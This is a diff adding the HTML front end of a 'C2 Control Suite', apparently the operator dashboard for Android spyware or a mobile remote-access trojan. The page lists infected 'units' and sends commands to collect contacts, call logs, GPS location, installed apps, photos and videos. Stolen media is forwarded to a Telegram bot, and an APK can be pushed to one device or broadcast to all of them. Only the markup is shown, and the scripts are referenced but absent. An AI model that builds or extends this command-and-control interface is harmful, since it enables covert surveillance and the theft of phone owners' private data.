@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Control Suite — Operations Dashboard</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Leaflet Map CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="dashboard-body">
+
+<div class="app-layout">
+
+    <!-- Top Navigation Header -->
+    <header class="app-header">
+        <div class="header-left">
+            <button id="mobileSidebarToggle" class="btn-mobile-sidebar-toggle" onclick="toggleMobileSidebar()" title="Toggle Device Panel">
+                <i class="fa-solid fa-mobile-screen"></i>
+                <span>Units</span>
+            </button>
+            <div class="brand-badge-small">
+                <span class="pulse-indicator"></span>
+                <span>SYSTEM LIVE</span>
+            </div>
+            <div class="app-logo">
+                <i class="fa-solid fa-satellite-dish brand-icon-glow"></i>
+                <div class="logo-text">
+                    <span class="logo-title">C2 <span>CENTRAL</span></span>
+                    <span class="logo-sub">Remote Management Console</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="header-center">
+            <div class="global-search">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <input type="text" id="globalDeviceSearch" placeholder="Search devices by model, ID or IP...">
+            </div>
+        </div>
+
+        <div class="header-right">
+            <div class="quick-status-pill">
+                <i class="fa-solid fa-wifi"></i>
+                <span id="networkStatusText">Connected to Cloud</span>
+            </div>
+
+            <div class="user-profile-badge">
+                <div class="avatar-circle">
+                    <i class="fa-solid fa-user-shield"></i>
+                </div>
+                <div class="user-details">
+                    <span class="user-email-text" id="userEmail">admin@c2console.net</span>
+                    <span class="user-role-text">Master Operator</span>
+                </div>
+            </div>
+
+            <button id="logoutBtn" class="btn-action-outline btn-danger-glow" title="Terminate Session">
+                <i class="fa-solid fa-right-from-bracket"></i>
+                <span>Logout</span>
+            </button>
+        </div>
+    </header>
+
+    <!-- Mobile Drawer Overlay Backdrop -->
+    <div class="sidebar-backdrop" id="sidebarBackdrop" onclick="toggleMobileSidebar()"></div>
+
+    <!-- Top Statistics Overview -->
+    <section class="stats-overview">
+        <div class="stat-card" id="statCardTotal">
+            <div class="stat-icon-wrapper cyan-glow">
+                <i class="fa-solid fa-mobile-screen-button"></i>
+            </div>
+            <div class="stat-meta">
+                <div class="stat-value" id="totalDevices">0</div>
+                <div class="stat-title">Total Devices</div>
+            </div>
+            <div class="stat-badge">All Time</div>
+        </div>
+
+        <div class="stat-card" id="statCardOnline">
+            <div class="stat-icon-wrapper green-glow">
+                <i class="fa-solid fa-signal"></i>
+            </div>
+            <div class="stat-meta">
+                <div class="stat-value text-emerald" id="onlineDevices">0</div>
+                <div class="stat-title">Online Now</div>
+            </div>
+            <div class="stat-badge emerald-badge"><i class="fa-solid fa-circle text-pulse"></i> Active</div>
+        </div>
+
+        <div class="stat-card" id="statCardOffline">
+            <div class="stat-icon-wrapper red-glow">
+                <i class="fa-solid fa-power-off"></i>
+            </div>
+            <div class="stat-meta">
+                <div class="stat-value text-rose" id="offlineDevices">0</div>
+                <div class="stat-title">Offline</div>
+            </div>
+            <div class="stat-badge rose-badge">Standby</div>
+        </div>
+
+        <div class="stat-card" id="statCardContacts">
+            <div class="stat-icon-wrapper indigo-glow">
+                <i class="fa-solid fa-address-book"></i>
+            </div>
+            <div class="stat-meta">
+                <div class="stat-value" id="totalContacts">0</div>
+                <div class="stat-title">Synced Contacts</div>
+            </div>
+            <div class="stat-badge">Phonebook</div>
+        </div>
+
+        <div class="stat-card" id="statCardPhotos">
+            <div class="stat-icon-wrapper amber-glow">
+                <i class="fa-solid fa-images"></i>
+            </div>
+            <div class="stat-meta">
+                <div class="stat-value" id="totalPhotosCount">0</div>
+                <div class="stat-title">Photos Captured</div>
+            </div>
+            <div class="stat-badge">Gallery</div>
+        </div>
+    </section>
+
+    <!-- Main Workspace Grid -->
+    <main class="main-dashboard-grid">
+
+        <!-- Left Sidebar: Devices Management -->
+        <aside class="sidebar-panel" id="deviceSidebarPanel">
+            <div class="panel-header">
+                <div class="panel-header-title">
+                    <i class="fa-solid fa-layer-group"></i>
+                    <span>Connected Units</span>
+                </div>
+                <div class="sidebar-header-actions">
+                    <button class="btn-icon-refresh" onclick="refreshDevices()" title="Refresh device list">
+                        <i class="fa-solid fa-rotate"></i>
+                    </button>
+                    <button class="btn-close-mobile-sidebar" onclick="toggleMobileSidebar()" title="Close Drawer">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Device Filter Bar -->
+            <div class="filter-tabs">
+                <button class="filter-tab active" data-filter="all" onclick="filterDevices('all')">
+                    All (<span id="filterCountAll">0</span>)
+                </button>
+                <button class="filter-tab" data-filter="online" onclick="filterDevices('online')">
+                    Online (<span id="filterCountOnline">0</span>)
+                </button>
+                <button class="filter-tab" data-filter="offline" onclick="filterDevices('offline')">
+                    Offline (<span id="filterCountOffline">0</span>)
+                </button>
+            </div>
+
+            <!-- Device List Container -->
+            <div class="device-list-scrollable" id="deviceList">
+                <div class="empty-state">
+                    <i class="fa-solid fa-spinner fa-spin"></i>
+                    <p>Connecting to Firebase database...</p>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Right Content: Device Control & Full Data Suite -->
+        <section class="content-workspace">
+
+            <!-- Active Device Control Center -->
+            <div class="control-center-panel">
+                <div class="device-banner">
+                    <div class="device-banner-info">
+                        <div class="device-avatar">
+                            <i class="fa-solid fa-mobile-screen"></i>
+                        </div>
+                        <div class="device-banner-meta">
+                            <div class="device-title-row">
+                                <h2 id="activeDeviceTitle">No Device Selected</h2>
+                                <span class="status-chip offline" id="activeDeviceStatusChip">
+                                    <i class="fa-solid fa-circle"></i> <span>Offline</span>
+                                </span>
+                            </div>
+                            <div class="device-sub-meta">
+                                <span id="activeDeviceIdTag"><i class="fa-solid fa-fingerprint"></i> ID: None</span>
+                                <span class="divider-dot">•</span>
+                                <span id="activeDeviceLastSeen"><i class="fa-regular fa-clock"></i> Last Seen: -</span>
+                                <span class="divider-dot">•</span>
+                                <span id="activeDeviceBattery"><i class="fa-solid fa-battery-half"></i> Battery: -</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="device-banner-actions">
+                        <button class="btn-cyber-primary" onclick="openApkUpdateModal()" title="Push new APK to this device or all devices">
+                            <i class="fa-solid fa-cloud-arrow-up"></i>
+                            <span>Push APK Update</span>
+                        </button>
+                        <button class="btn-cyber-danger" onclick="confirmDeleteCurrentDevice()" title="Delete this device from database">
+                            <i class="fa-solid fa-trash-can"></i>
+                            <span>Delete Device</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Command Quick Buttons -->
+                <div class="quick-commands-bar">
+                    <div class="command-select-group">
+                        <label><i class="fa-solid fa-terminal"></i> Command:</label>
+                        <select id="quickCommandSelect" class="cyber-select">
+                            <option value="ping">⚡ Ping Device</option>
+                            <option value="collect_contacts">👥 Collect Contacts</option>
+                            <option value="collect_calls">📞 Collect Call Logs</option>
+                            <option value="collect_location">📍 Get GPS Location</option>
+                            <option value="collect_apps">📱 Get Installed Apps</option>
+                            <option value="collect_photos">📷 Collect Photos (→ Telegram/Cloud)</option>
+                            <option value="collect_videos">🎥 Collect Videos (→ Telegram/Cloud)</option>
+                            <option value="get_storage">💾 Get Storage Info</option>
+                            <option value="collect_all">🚀 Collect All Data</option>
+                            <option value="vibrate">📳 Vibrate Device</option>
+                        </select>
+                        <button onclick="sendQuickCommand()" class="btn-action-primary">
+                            <i class="fa-solid fa-paper-plane"></i> Send
+                        </button>
+                    </div>
+
+                    <div class="command-feedback" id="commandStatusFeedback">
+                        <span>Select a device to issue real-time commands</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tabbed Data Suite -->
+            <div class="data-suite-panel">
+                <div class="nav-tabs-wrapper">
+                    <button class="tabs-nav-arrow prev" onclick="scrollSuiteTabs(-160)" title="Scroll Left">
+                        <i class="fa-solid fa-chevron-left"></i>
+                    </button>
+                    <div class="tabs-list" id="suiteTabsList">
+                        <button class="suite-tab active" data-tab="info" onclick="switchSuiteTab('info')">
+                            <i class="fa-solid fa-circle-info"></i>
+                            <span>Device Info</span>
+                        </button>
+                        <button class="suite-tab" data-tab="contacts" onclick="switchSuiteTab('contacts')">
+                            <i class="fa-solid fa-address-book"></i>
+                            <span>Contacts</span>
+                            <span class="tab-pill-badge" id="badgeContacts">0</span>
+                        </button>
+                        <button class="suite-tab" data-tab="location" onclick="switchSuiteTab('location')">
+                            <i class="fa-solid fa-map-location-dot"></i>
+                            <span>GPS Location</span>
+                            <span class="tab-pill-badge" id="badgeLocation">Off</span>
+                        </button>
+                        <button class="suite-tab" data-tab="apps" onclick="switchSuiteTab('apps')">
+                            <i class="fa-solid fa-cubes"></i>
+                            <span>Installed Apps</span>
+                            <span class="tab-pill-badge" id="badgeApps">0</span>
+                        </button>
+                        <button class="suite-tab" data-tab="photos" onclick="switchSuiteTab('photos')">
+                            <i class="fa-solid fa-photo-film"></i>
+                            <span>Photos & Media</span>
+                            <span class="tab-pill-badge" id="badgePhotos">0</span>
+                        </button>
+                        <button class="suite-tab" data-tab="telegram" onclick="switchSuiteTab('telegram')">
+                            <i class="fa-brands fa-telegram text-cyan"></i>
+                            <span>Telegram Hub</span>
+                            <span class="tab-pill-badge" id="badgeTelegram">Bot</span>
+                        </button>
+                        <button class="suite-tab" data-tab="calls" onclick="switchSuiteTab('calls')">
+                            <i class="fa-solid fa-phone-volume"></i>
+                            <span>Call Logs</span>
+                            <span class="tab-pill-badge" id="badgeCalls">0</span>
+                        </button>
+                        <button class="suite-tab" data-tab="logs" onclick="switchSuiteTab('logs')">
+                            <i class="fa-solid fa-code"></i>
+                            <span>System Logs</span>
+                        </button>
+                    </div>
+                    <button class="tabs-nav-arrow next" onclick="scrollSuiteTabs(160)" title="Scroll Right">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </button>
+                </div>
+
+                <!-- Tab 1: Device Info -->
+                <div id="tab-info" class="tab-panel active">
+                    <div class="tab-panel-toolbar">
+                        <span class="toolbar-title"><i class="fa-solid fa-microchip"></i> Hardware & System Specifications</span>
+                        <button class="btn-sm-ghost" onclick="copyDeviceInfoText()"><i class="fa-regular fa-copy"></i> Copy Spec Sheet</button>
+                    </div>
+                    <div class="device-specs-grid" id="specsGrid">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-mobile-screen"></i>
+                            <p>Select an active device from the left panel to view detailed hardware and OS telemetry.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 2: Contacts Manager -->
+                <div id="tab-contacts" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <div class="toolbar-search">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                            <input type="text" id="contactsSearchInput" placeholder="Search contacts by name or phone..." oninput="filterContactsList()">
+                        </div>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="requestContactsRefresh()">
+                                <i class="fa-solid fa-rotate"></i> Fetch From Device
+                            </button>
+                            <button class="btn-sm-danger" onclick="confirmDeleteAllContacts()">
+                                <i class="fa-solid fa-trash-can"></i> Delete All Contacts
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="contacts-table-container">
+                        <div id="contactsListContainer">
+                            <div class="empty-panel-prompt">
+                                <i class="fa-solid fa-address-book"></i>
+                                <p>Select a device to inspect or delete synced contact numbers.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 3: GPS Location & Interactive Map -->
+                <div id="tab-location" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <div class="location-coords-summary" id="locationCoordsSummary">
+                            <i class="fa-solid fa-location-crosshairs text-emerald"></i>
+                            <span>No GPS Coordinates Available</span>
+                        </div>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="requestLocationRefresh()">
+                                <i class="fa-solid fa-location-arrow"></i> Request Live GPS
+                            </button>
+                            <a id="btnOpenGoogleMaps" href="#" target="_blank" class="btn-sm-ghost disabled-link">
+                                <i class="fa-solid fa-arrow-up-right-from-square"></i> Open in Google Maps
+                            </a>
+                            <button class="btn-sm-danger" onclick="confirmDeleteLocationData()">
+                                <i class="fa-solid fa-trash-can"></i> Clear Location
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="location-layout">
+                        <!-- Leaflet Interactive Map -->
+                        <div id="mapContainer" class="leaflet-map-wrapper"></div>
+
+                        <!-- Location Metadata Card -->
+                        <div class="location-meta-card" id="locationMetaCard">
+                            <h3><i class="fa-solid fa-satellite"></i> Telemetry Coordinates</h3>
+                            <div class="telemetry-item">
+                                <span class="t-label">Latitude:</span>
+                                <span class="t-value" id="locLat">-</span>
+                            </div>
+                            <div class="telemetry-item">
+                                <span class="t-label">Longitude:</span>
+                                <span class="t-value" id="locLng">-</span>
+                            </div>
+                            <div class="telemetry-item">
+                                <span class="t-label">Accuracy:</span>
+                                <span class="t-value" id="locAccuracy">-</span>
+                            </div>
+                            <div class="telemetry-item">
+                                <span class="t-label">Altitude:</span>
+                                <span class="t-value" id="locAltitude">-</span>
+                            </div>
+                            <div class="telemetry-item">
+                                <span class="t-label">Speed:</span>
+                                <span class="t-value" id="locSpeed">-</span>
+                            </div>
+                            <div class="telemetry-item">
+                                <span class="t-label">Last Ping:</span>
+                                <span class="t-value" id="locTimestamp">-</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 4: Installed Apps -->
+                <div id="tab-apps" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <div class="toolbar-search">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                            <input type="text" id="appsSearchInput" placeholder="Search installed apps by name or package..." oninput="filterAppsList()">
+                        </div>
+                        <div class="app-filter-chips">
+                            <button class="filter-chip active" data-appfilter="all" onclick="filterAppsByCategory('all')">All</button>
+                            <button class="filter-chip" data-appfilter="user" onclick="filterAppsByCategory('user')">User Apps</button>
+                            <button class="filter-chip" data-appfilter="system" onclick="filterAppsByCategory('system')">System Apps</button>
+                        </div>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="requestAppsRefresh()">
+                                <i class="fa-solid fa-rotate"></i> Scan Installed Apps
+                            </button>
+                            <button class="btn-sm-danger" onclick="confirmDeleteAppsData()">
+                                <i class="fa-solid fa-trash-can"></i> Clear Apps List
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="apps-grid-container" id="appsGridContainer">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-cubes"></i>
+                            <p>Select a device to view installed applications and packages.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 5: Photos & Media Gallery -->
+                <div id="tab-photos" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <span class="toolbar-title"><i class="fa-solid fa-images"></i> Device Camera & Media Gallery</span>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="requestPhotosRefresh()">
+                                <i class="fa-solid fa-camera"></i> Capture Photos
+                            </button>
+                            <button class="btn-sm-primary" onclick="requestVideosRefresh()">
+                                <i class="fa-solid fa-video"></i> Capture Videos
+                            </button>
+                            <button class="btn-sm-danger" onclick="confirmDeleteAllPhotos()">
+                                <i class="fa-solid fa-trash-can"></i> Delete All Media
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="photos-gallery-grid" id="photosGalleryGrid">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-photo-film"></i>
+                            <p>No photos or media collected yet. Send the 'Collect Photos' command to retrieve photos.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 6: Telegram Bot & Media Hub (NEW) -->
+                <div id="tab-telegram" class="tab-panel">
+                    <div class="telegram-config-card">
+                        <div class="telegram-config-header">
+                            <div class="telegram-title">
+                                <i class="fa-brands fa-telegram text-cyan"></i>
+                                <span>Telegram Bot Configuration & Media Stream</span>
+                            </div>
+                            <span class="status-chip" id="telegramBotStatusChip">
+                                <i class="fa-solid fa-circle"></i> <span id="telegramBotStatusText">Not Configured</span>
+                            </span>
+                        </div>
+
+                        <div class="telegram-config-grid">
+                            <div class="input-group">
+                                <label for="telegramBotToken"><i class="fa-solid fa-key"></i> Telegram Bot Token</label>
+                                <div class="input-wrapper">
+                                    <input type="password" id="telegramBotToken" placeholder="123456789:AAHfd7..." class="cyber-input">
+                                    <button type="button" class="btn-toggle-pw" onclick="toggleTelegramTokenVisibility()">
+                                        <i class="fa-regular fa-eye" id="tgTokenEye"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div class="input-group">
+                                <label for="telegramChatId"><i class="fa-regular fa-id-badge"></i> Receiver Chat ID</label>
+                                <input type="text" id="telegramChatId" placeholder="e.g. 987654321" class="cyber-input">
+                            </div>
+                        </div>
+
+                        <div class="telegram-config-actions">
+                            <button class="btn-sm-primary" onclick="saveTelegramConfig()">
+                                <i class="fa-solid fa-floppy-disk"></i> Save Credentials
+                            </button>
+                            <button class="btn-sm-ghost" onclick="testTelegramBotAlert()">
+                                <i class="fa-solid fa-bell"></i> Send Test Message
+                            </button>
+                            <button class="btn-sm-primary" onclick="syncTelegramBotMedia()">
+                                <i class="fa-solid fa-cloud-arrow-down"></i> Sync Bot Media (Photos & Videos)
+                            </button>
+                            <button class="btn-sm-ghost" onclick="triggerDeviceTelegramPhotos()">
+                                <i class="fa-solid fa-camera"></i> Collect Photos (→ Telegram)
+                            </button>
+                            <button class="btn-sm-ghost" onclick="triggerDeviceTelegramVideos()">
+                                <i class="fa-solid fa-video"></i> Collect Videos (→ Telegram)
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="tab-panel-toolbar" style="margin-top: 14px;">
+                        <div class="app-filter-chips">
+                            <button class="filter-chip active" data-tgfilter="all" onclick="filterTelegramMedia('all')">All Media</button>
+                            <button class="filter-chip" data-tgfilter="photos" onclick="filterTelegramMedia('photos')">Photos Only</button>
+                            <button class="filter-chip" data-tgfilter="videos" onclick="filterTelegramMedia('videos')">Videos Only</button>
+                        </div>
+                        <span class="text-muted" id="tgMediaCountText" style="font-size: 12px;">0 items retrieved from Telegram</span>
+                    </div>
+
+                    <!-- Telegram Photos & Videos Grid -->
+                    <div class="telegram-media-grid" id="telegramMediaGrid">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-brands fa-telegram"></i>
+                            <p>Configure your Telegram Bot Token & Chat ID above and click 'Sync Bot Media' to preview photos and videos sent to your Telegram bot.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 7: Call Logs -->
+                <div id="tab-calls" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <div class="toolbar-search">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                            <input type="text" id="callsSearchInput" placeholder="Search call logs by phone number..." oninput="filterCallsList()">
+                        </div>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="requestCallsRefresh()">
+                                <i class="fa-solid fa-rotate"></i> Fetch Call Logs
+                            </button>
+                            <button class="btn-sm-danger" onclick="confirmDeleteAllCalls()">
+                                <i class="fa-solid fa-trash-can"></i> Clear Call Logs
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="calls-table-container" id="callsContainer">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-phone-volume"></i>
+                            <p>Select a device to view incoming, outgoing and missed call histories.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 8: System & Audit Logs -->
+                <div id="tab-logs" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <span class="toolbar-title"><i class="fa-solid fa-terminal"></i> Command Execution & Stream Logs</span>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-danger" onclick="confirmDeleteDeviceLogs()">
+                                <i class="fa-solid fa-trash-can"></i> Clear Terminal Logs
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="cyber-terminal" id="logsDisplay">
+                        <div class="terminal-line system">[SYSTEM] Ready. Select a unit from the left panel.</div>
+                    </div>
+                </div>
+
+            </div>
+
+        </section>
+
+    </main>
+
+</div>
+
+<!-- ============================================================ -->
+<!-- MODAL: PUSH APK UPDATE -->
+<!-- ============================================================ -->
+<div class="modal-backdrop" id="apkUpdateModal">
+    <div class="modal-card">
+        <div class="modal-header">
+            <div class="modal-title">
+                <i class="fa-solid fa-cloud-arrow-up text-cyan"></i>
+                <span>Push APK Update to Devices</span>
+            </div>
+            <button class="modal-close-btn" onclick="closeApkUpdateModal()">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
+
+        <div class="modal-body">
+            <p class="modal-desc">
+                Deploy an updated APK binary directly to target devices. You can either upload a local <code>.apk</code> file to Firebase Storage or provide a direct download URL.
+            </p>
+
+            <div class="update-method-switcher">
+                <button type="button" class="method-btn active" id="btnMethodUpload" onclick="switchApkMethod('upload')">
+                    <i class="fa-solid fa-file-arrow-up"></i> Upload APK File
+                </button>
+                <button type="button" class="method-btn" id="btnMethodUrl" onclick="switchApkMethod('url')">
+                    <i class="fa-solid fa-link"></i> Direct Download URL
+                </button>
+            </div>
+
+            <!-- Option 1: File Upload -->
+            <div id="methodUploadSection" class="method-content active">
+                <div class="file-dropzone" id="apkDropZone">
+                    <i class="fa-solid fa-box-archive dropzone-icon"></i>
+                    <p class="dropzone-text">Click to browse or drag & drop <strong>.apk</strong> file</p>
+                    <span class="dropzone-sub">Uploads securely to Firebase Storage bucket</span>
+                    <input type="file" id="apkFileInput" accept=".apk" style="display: none;">
+                </div>
+                <div class="selected-file-info" id="selectedFileInfo" style="display: none;">
+                    <i class="fa-solid fa-file-zipper text-emerald"></i>
+                    <span id="selectedFileName">update.apk</span>
+                    <span id="selectedFileSize" class="text-muted">(0 MB)</span>
+                </div>
+
+                <div class="upload-progress-container" id="uploadProgressContainer" style="display: none;">
+                    <div class="progress-header">
+                        <span>Uploading to Cloud...</span>
+                        <span id="uploadPercentage">0%</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                        <div class="progress-bar-fill" id="uploadProgressBar" style="width: 0%;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Option 2: Direct URL -->
+            <div id="methodUrlSection" class="method-content">
+                <div class="input-group">
+                    <label for="apkDirectUrl"><i class="fa-solid fa-globe"></i> Direct APK Download URL</label>
+                    <input type="url" id="apkDirectUrl" placeholder="https://example.com/downloads/client-update.apk" class="cyber-input">
+                </div>
+            </div>
+
+            <!-- Update Metadata -->
+            <div class="update-meta-fields">
+                <div class="input-group">
+                    <label for="apkVersionCode"><i class="fa-solid fa-tag"></i> Version Name / Code</label>
+                    <input type="text" id="apkVersionCode" placeholder="e.g. v2.1.0 (Build 45)" class="cyber-input">
+                </div>
+                <div class="input-group">
+                    <label for="apkTargetScope"><i class="fa-solid fa-crosshairs"></i> Target Scope</label>
+                    <select id="apkTargetScope" class="cyber-select">
+                        <option value="selected">Target Only Selected Device</option>
+                        <option value="all">Broadcast to ALL Connected Devices (Push Global)</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="apkReleaseNotes"><i class="fa-regular fa-message"></i> Changelog / Update Instructions (Optional)</label>
+                <input type="text" id="apkReleaseNotes" placeholder="Critical bug fixes, performance upgrade..." class="cyber-input">
+            </div>
+
+            <div id="apkPushStatus" class="status-msg"></div>
+        </div>
+
+        <div class="modal-footer">
+            <button class="btn-modal-ghost" onclick="closeApkUpdateModal()">Cancel</button>
+            <button class="btn-modal-primary" id="btnSubmitApkUpdate" onclick="submitApkPush()">
+                <i class="fa-solid fa-paper-plane"></i>
+                <span id="btnSubmitApkText">Push APK Update</span>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- MODAL: CONFIRM DELETION -->
+<!-- ============================================================ -->
+<div class="modal-backdrop" id="confirmDeleteModal">
+    <div class="modal-card modal-sm">
+        <div class="modal-header modal-danger-header">
+            <div class="modal-title">
+                <i class="fa-solid fa-triangle-exclamation text-rose"></i>
+                <span id="deleteModalTitle">Confirm Action</span>
+            </div>
+            <button class="modal-close-btn" onclick="closeConfirmModal()">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
+        <div class="modal-body">
+            <p id="deleteModalMessage" class="modal-desc">Are you sure you want to permanently delete this item from the database?</p>
+        </div>
+        <div class="modal-footer">
+            <button class="btn-modal-ghost" onclick="closeConfirmModal()">Cancel</button>
+            <button class="btn-modal-danger" id="btnConfirmDeleteAction">
+                <i class="fa-solid fa-trash-can"></i>
+                <span>Yes, Permanently Delete</span>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- MODAL: PHOTO LIGHTBOX ZOOM -->
+<!-- ============================================================ -->
+<div class="lightbox-backdrop" id="photoLightboxModal" onclick="closePhotoLightbox(event)">
+    <div class="lightbox-content">
+        <button class="lightbox-close-btn" onclick="closePhotoLightbox(null)">
+            <i class="fa-solid fa-xmark"></i>
+        </button>
+        <div class="lightbox-img-wrapper">
+            <img id="lightboxImage" src="" alt="Captured Image Preview">
+        </div>
+        <div class="lightbox-caption">
+            <span id="lightboxTimestamp"><i class="fa-regular fa-clock"></i> Timestamp</span>
+            <div class="lightbox-actions">
+                <a id="lightboxDownloadBtn" href="#" download="photo.jpg" class="btn-sm-primary" target="_blank">
+                    <i class="fa-solid fa-download"></i> Download Full Resolution
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- MODAL: VIDEO LIGHTBOX PLAYER (NEW) -->
+<!-- ============================================================ -->
+<div class="lightbox-backdrop" id="videoLightboxModal" onclick="closeVideoLightbox(event)">
+    <div class="lightbox-content">
+        <button class="lightbox-close-btn" onclick="closeVideoLightbox(null)">
+            <i class="fa-solid fa-xmark"></i>
+        </button>
+        <div class="lightbox-video-wrapper">
+            <video id="lightboxVideo" controls autoplay playsinline class="modal-video-element"></video>
+        </div>
+        <div class="lightbox-caption">
+            <span id="lightboxVideoTimestamp"><i class="fa-regular fa-clock"></i> Video Capture</span>
+            <div class="lightbox-actions">
+                <a id="lightboxVideoDownloadBtn" href="#" download="video.mp4" class="btn-sm-primary" target="_blank">
+                    <i class="fa-solid fa-download"></i> Download Video
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- TOAST NOTIFICATIONS CONTAINER -->
+<!-- ============================================================ -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ============================================================ -->
+<!-- SCRIPTS & SDKs -->
+<!-- ============================================================ -->
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+
+<!-- Leaflet Interactive Map JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<!-- App Scripts -->
+<script src="js/firebase.js"></script>
+<script src="js/login.js"></script>
+
+</body>
+</html>
